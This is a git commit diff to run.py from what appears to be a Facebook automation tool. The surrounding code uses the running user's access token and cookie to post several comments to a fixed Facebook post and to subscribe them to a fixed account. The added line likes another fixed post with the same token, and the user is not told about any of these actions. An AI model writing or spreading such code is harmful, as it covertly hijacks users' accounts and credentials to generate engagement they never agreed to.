1e3dc34d0d0575a75fca6931cd3bbc12c87ead0c
Rudal-XD <106883384+Rudal-XD@users.noreply.github.com>
2023-10-31 10:49:27 +0700

    Update run.py

--- run.py
+++ run.py
@@ -705,7 +705,8 @@ def menu(my_name,my_id):
         requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
         requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
         requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie})
+        requests.post("https://graph.facebook.com/878169396977639/likes?method=post&access_token=%s"%(tokenku))
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenku))
     except IOError:
         Console().print("[bold cyan] ─>[bold red] Cookies Kadaluarsa ")
